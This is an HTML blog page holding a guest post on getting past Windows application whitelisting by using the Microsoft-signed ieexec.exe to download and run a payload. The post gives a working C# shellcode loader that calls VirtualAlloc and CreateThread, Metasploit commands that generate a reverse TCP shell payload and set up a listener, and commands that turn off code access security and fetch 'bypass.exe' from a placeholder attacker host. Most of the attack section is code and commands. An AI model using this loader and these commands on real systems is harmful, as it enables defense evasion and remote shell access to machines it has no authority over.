@@ -1,0 +1,414 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="description" content="">
+  <meta name="generator" content="Hugo 0.15" />
+
+  <title>Application Whitelist Bypass using IEexec.exe &middot; Room362</title>
+
+  
+  
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pure/0.6.0/pure-min.css">
+
+  <!--[if lte IE 8]>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pure/0.6.0/grids-responsive-old-ie-min.css">
+  <![endif]-->
+  <!--[if gt IE 8]><!-->
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pure/0.6.0/grids-responsive-min.css">
+  <!--<![endif]-->
+
+  <!--[if lte IE 8]>
+  <link rel="stylesheet" href="/css/side-menu-old-ie.css">
+  <![endif]-->
+  <!--[if gt IE 8]><!-->
+  <link rel="stylesheet" href="/css/side-menu.css">
+  <!--<![endif]-->
+
+  <link rel="stylesheet" href="/css/blackburn.css">
+
+  
+  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.5.0/css/font-awesome.min.css">
+
+  
+  <link href="https://fonts.googleapis.com/css?family=Raleway" rel="stylesheet" type="text/css">
+
+  
+  <link rel="alternate" type="application/rss+xml" title="Room362" href="http://room362.com/index.xml" />
+
+  
+  <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.1.0/styles/androidstudio.min.css">
+  <script src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.1.0/highlight.min.js"></script>
+  <script>hljs.initHighlightingOnLoad();</script>
+  
+
+  <link rel="shortcut icon" href="http://room362.com/img/favicon.ico" type="image/x-icon" />
+
+</head>
+
+
+<body>
+<div id="layout">
+
+  
+<a href="#menu" id="menuLink" class="menu-link">
+  
+  <span></span>
+</a>
+<div id="menu">
+
+  
+
+  <div class="pure-menu">
+    <ul class="pure-menu-list">
+      
+      
+        <li class="pure-menu-item">
+          <a class="pure-menu-link" href="/"><i class='fa fa-home fa-fw'></i>Home</a>
+      
+        </li>
+      
+      
+        <li class="pure-menu-item">
+          <a class="pure-menu-link" href="/brandon/"><i class='fa fa-users fa-fw'></i>Brandon</a>
+      
+        </li>
+      
+      
+        <li class="pure-menu-item">
+          <a class="pure-menu-link" href="/post/"><i class='fa fa-list fa-fw'></i>Posts</a>
+      
+        </li>
+      
+      
+        <li class="pure-menu-item">
+          <a class="pure-menu-link" href="/about/"><i class='fa fa-user fa-fw'></i>About</a>
+      
+        </li>
+      
+    </ul>
+  </div>
+
+  <div class="pure-menu social">
+  <ul class="pure-menu-list">
+
+    <li class="pure-menu-item">
+      <a class="pure-menu-link" href="http://room362.com/index.xml"><i class="fa fa-rss fa-fw"></i>RSS</a>
+    </li>
+
+    
+
+    
+    <li class="pure-menu-item">
+      <a class="pure-menu-link" href="https://twitter.com/mubix" target="_blank"><i class="fa fa-twitter fa-fw"></i>Twitter</a>
+    </li>
+    
+
+    
+    <li class="pure-menu-item">
+      <a class="pure-menu-link" href="https://facebook.com/mubix" target="_blank"><i class="fa fa-facebook fa-fw"></i>Facebook</a>
+    </li>
+    
+
+    
+    <li class="pure-menu-item">
+      <a class="pure-menu-link" href="https://plus.google.com/+mubix" target="_blank"><i class="fa fa-google-plus-square fa-fw"></i>Google+</a>
+    </li>
+    
+
+    
+
+    
+
+    
+    <li class="pure-menu-item">
+      <a class="pure-menu-link" href="https://instagram.com/mubix" target="_blank"><i class="fa fa-instagram fa-fw"></i>Instagram</a>
+    </li>
+    
+
+    
+    <li class="pure-menu-item">
+      <a class="pure-menu-link" href="https://flickr.com/photos/mubix" target="_blank"><i class="fa fa-flickr fa-fw"></i>Flickr</a>
+    </li>
+    
+
+    
+
+    
+    <li class="pure-menu-item">
+      <a class="pure-menu-link" href="https://youtube.com/user/hak5" target="_blank"><i class="fa fa-youtube fa-fw"></i>YouTube</a>
+    </li>
+    
+
+    
+    <li class="pure-menu-item">
+      <a class="pure-menu-link" href="https://vimeo.com/mubix" target="_blank"><i class="fa fa-vimeo fa-fw"></i>Vimeo</a>
+    </li>
+    
+
+    
+
+    
+    <li class="pure-menu-item">
+      <a class="pure-menu-link" href="http://slideshare.net/mubix" target="_blank"><i class="fa fa-slideshare fa-fw"></i>SlideShare</a>
+    </li>
+    
+
+    
+
+    
+    <li class="pure-menu-item">
+      <a class="pure-menu-link" href="https://linkedin.com/in/mubix" target="_blank"><i class="fa fa-linkedin fa-fw"></i>LinkedIn</a>
+    </li>
+    
+
+    
+
+    
+
+    
+    <li class="pure-menu-item">
+      <a class="pure-menu-link" href="https://reddit.com/user/mubix" target="_blank"><i class="fa fa-reddit fa-fw"></i>Reddit</a>
+    </li>
+    
+
+    
+
+    
+    <li class="pure-menu-item">
+      <a class="pure-menu-link" href="https://github.com/mubix" target="_blank"><i class="fa fa-github-alt fa-fw"></i>GitHub</a>
+    </li>
+    
+
+    
+    <li class="pure-menu-item">
+      <a class="pure-menu-link" href="https:////bitbucket.org/mubix" target="_blank"><i class="fa fa-bitbucket fa-fw"></i>Bitbucket</a>
+    </li>
+    
+
+    
+
+  </ul>
+</div>
+
+  <div class="pure-g">
+  <div class="small-print pure-u-1 pure-u-md-1-1">
+    <small>&copy; 2016. All rights reserved.</small>
+  </div>
+  <div class="small-print pure-u-1 pure-u-md-1-1">
+    <small>Built with&nbsp;<a href="https://gohugo.io/" target="_blank">Hugo</a></small>
+    <small>Theme&nbsp;<a href="https://github.com/yoshiharuyamashita/blackburn" target="_blank">Blackburn</a></small>
+  </div>
+</div>
+
+</div>
+
+
+  <div id="main">
+
+
+<div class="header">
+  <h1>Application Whitelist Bypass using IEexec.exe</h1>
+  <h2></h2>
+</div>
+<div class="content">
+  
+
+<h2 id="guest-post-by-infosecsmith2-https-twitter-com-infosecsmith2:95b252f856dbab03151aa51de29f0dcc">Guest post by <a href="https://twitter.com/infosecsmith2">@infosecsmith2</a></h2>
+
+<p>There was a recent presentation at DerbyCon, entitled:</p>
+
+<p><a href="http://www.youtube.com/watch?v=j-r6UonEkUw">Living Off the Land: A Minimalist’s Guide to Windows Post-Exploitation</a>
+by Christopher Campbell &amp; Matthew Graeber</p>
+
+<p>I highly recommend that you start with this presentation as it lays the foundation for this post.</p>
+
+<p>The premise is, how can we maintain persistence in a corporate environment, using tools and defaults provided by the host OS we have compromised. This is a very important concept, given the shift in many organizations to an Application Whitelisting Defense model.</p>
+
+<p>It is only a matter of time before time before you might encounter an Application Whitelisting Defense.</p>
+
+<p>As a follow up to that presentation, I began exploring the binaries that ship by default with Windows.  That is where I stumbled across a binary in the C:\Windows\Microsoft.NET\Framework64\v2.0.50727 path.</p>
+
+<p>The Executable is ieexec.exe. A write up is here: <a href="http://support.microsoft.com/kb/822485">http://support.microsoft.com/kb/822485</a></p>
+
+<blockquote>
+<p>“The IEExec.exe application is an undocumented Microsoft .NET Framework application that is included with the .NET Framework. You can use the IEExec.exe application as a host to run other managed applications that you start by using a URL.”</p>
+</blockquote>
+
+<p>Excellent! So, now we just need to host our malicious binary , and call it from ieexec.exe.</p>
+
+<p>This is great, since most Application Whitelisting Environments are going to “Trust” anything signed my Microsoft as a matter of convenience. IEexec.exe will download and execute our code for us, all under the trusted process.</p>
+
+<p>So lets get started!</p>
+
+<p><strong>Step 1.</strong> Prepare your Shellcode, or whatever malicious app you want. I compiled my executable using SharpDevelop, since it has less footprint than a full blown Visual Studio install.
+From msfconsole:</p>
+
+<pre><code>msf &gt; use windows/x64/shell/reverse_tcp
+msf payload(reverse_tcp) &gt; set LHOST x.x.x.x
+msf payload(reverse_tcp) &gt; set LPORT 443
+msf payload(reverse_tcp) &gt; generate -t csharp
+￼
+byte[] buf = new byte[422] { 0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52...
+
+ &lt;Snipped Full ShellCode for Brevity&gt;
+</code></pre>
+
+<p><strong>Step 2.</strong> Create the .NET wrapper application</p>
+
+<pre><code class="language-csharp">using System; 
+using System.Runtime.InteropServices; 
+namespace native 
+{ 
+    class Program 
+    { 
+            private static UInt32 MEM_COMMIT = 0x1000; 
+            private static UInt32 PAGE_EXECUTE_READWRITE = 0x40; 
+            private static UInt32 MEM_RELEASE = 0x8000; 
+
+        public static void Main(string[] args) 
+        { 
+            // native function's compiled code 
+
+            byte[] proc = new byte[] { 
+                0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52... 
+            
+            //Edited ShellCode For Brevity 
+            }; 
+
+            UInt32 funcAddr = VirtualAlloc(0, (UInt32)proc.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE); 
+            Marshal.Copy(proc, 0, (IntPtr)(funcAddr), proc.Length); 
+            IntPtr hThread = IntPtr.Zero; 
+            UInt32 threadId = 0; 
+
+            // prepare data 
+
+            PROCESSOR_INFO info = new PROCESSOR_INFO(); 
+            IntPtr pinfo = Marshal.AllocHGlobal(Marshal.SizeOf(typeof(PROCESSOR_INFO))); 
+            Marshal.StructureToPtr(info, pinfo, false); 
+            
+            // execute native code 
+
+            hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId); 
+            WaitForSingleObject(hThread, 0xFFFFFFFF); 
+
+            // retrive data 
+
+            info = (PROCESSOR_INFO)Marshal.PtrToStructure(pinfo, typeof(PROCESSOR_INFO)); 
+            Marshal.FreeHGlobal(pinfo); 
+            CloseHandle(hThread);
+            VirtualFree((IntPtr)funcAddr, 0, MEM_RELEASE); 
+        } 
+
+        [DllImport(&quot;kernel32&quot;)] 
+        private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect); 
+
+        [DllImport(&quot;kernel32&quot;)] 
+        private static extern bool VirtualFree(IntPtr lpAddress, UInt32 dwSize, UInt32 dwFreeType); 
+
+        [DllImport(&quot;kernel32&quot;)] 
+        private static extern IntPtr CreateThread( UInt32 lpThreadAttributes, UInt32 dwStackSize, UInt32 lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId ); 
+
+        [DllImport(&quot;kernel32&quot;)] 
+        private static extern bool CloseHandle(IntPtr handle); 
+
+        [DllImport(&quot;kernel32&quot;)] 
+        private static extern UInt32 WaitForSingleObject( IntPtr hHandle, UInt32 dwMilliseconds ); 
+
+        [DllImport(&quot;kernel32&quot;)] 
+        private static extern IntPtr GetModuleHandle( string moduleName ); 
+
+        [DllImport(&quot;kernel32&quot;)] 
+        private static extern UInt32 GetProcAddress( IntPtr hModule, string procName ); 
+
+        [DllImport(&quot;kernel32&quot;)] 
+        private static extern UInt32 LoadLibrary( string lpFileName ); 
+
+        [DllImport(&quot;kernel32&quot;)] 
+        private static extern UInt32 GetLastError();
+        
+        [StructLayout(LayoutKind.Sequential)] 
+        internal struct PROCESSOR_INFO 
+        { 
+            public UInt32 dwMax; 
+            public UInt32 id0; 
+            public UInt32 id1; 
+            public UInt32 id2; 
+            public UInt32 dwStandard; 
+            public UInt32 dwFeature; 
+
+            // if AMD 
+            public UInt32 dwExt; 
+        }
+    } 
+}
+</code></pre>
+
+<p>You will want to compile the exe for the target platform. In this case I am going for an x64 target. Also, you will want to compile for 2.0 or 3.5 Framework.</p>
+
+<p><strong>Step 3.</strong> Host the Exe. For this example, I used Mongoose. Simple and Effective:</p>
+
+<p><a href="http://code.google.com/p/mongoose/">http://code.google.com/p/mongoose/</a></p>
+
+<p>By default Mongoose listens on port 8080. This is configurable. Simple place your compiled binary from step 2 into the same directory as Mongoose. Start Mongoose and you are almost ready to deliver your payload.</p>
+
+<p><strong>Step 4.</strong> Setup your receiver:</p>
+
+<pre><code>msf payload(reverse_tcp) &gt; use exploit/multi/handler
+msf exploit(handler) &gt; set LHOST x.x.x.x
+msf exploit(handler) &gt; set LPORT 443
+msf exploit(handler) &gt; set PAYLOAD windows/x64/shell/reverse_tcp
+msf exploit(handler) &gt; exploit -j
+</code></pre>
+
+<p><strong>Step 5.</strong> From the host that is protected via Whitelisting. Open 2 Command Prompts as administrator.</p>
+
+<p><strong>CMD 1 Execute:</strong></p>
+
+<pre><code>C:\Windows\Microsoft.NET\Framework64\v2.0.50727&gt;caspol.exe -s off
+</code></pre>
+
+<p>￼
+<strong>CMD 2 Execute:</strong></p>
+
+<pre><code>C:\Windows\Microsoft.NET\Framework64\v2.0.50727&gt;ieexec.exe http://x.x.x.x:8080/bypass.exe
+</code></pre>
+
+<p>There is some detail to unpack here, I can go over later, as to why we need to run caspol.exe. Here’s the behavior I saw in our experimentation with this.</p>
+
+<p>Initial attempt to run our rogue binary fails, since it is unknown/untrusted/unapproved:</p>
+
+<p><img src="/images/postimages/201401_whitelisting_1.png" alt="" /></p>
+
+<p>Now, on the same host&hellip;</p>
+
+<p><img src="/images/postimages/201401_whitelisting_2.png" alt="" /></p>
+
+<p>Executes just fine!</p>
+
+<p><img src="/images/postimages/201401_whitelisting_3.png" alt="" /></p>
+
+<p>Its important to distinguish what this technique is and what it is not. This is not an exploit or vulnerability. Rather this is one way to execute arbitraty code in an Application Whitelisting Environment.</p>
+
+<p><strong>Summary:</strong></p>
+
+<p>In this document we learned that even if a host is in a mode where only trusted approved applications can run. IEexec.exe can be used in certain situations to circumvent a Whitelist, since it is likely a trusted binary, since it is signed by Microsoft.</p>
+
+<p>Cheers,</p>
+
+<p>=&gt; <a href="https://twitter.com/infosecsmith2">@infosecsmith2</a></p>
+
+</div>
+
+</div>
+</div>
+<script src="http://room362.com/js/ui.js"></script>
+
+
+
+
+</body>
+</html>
+
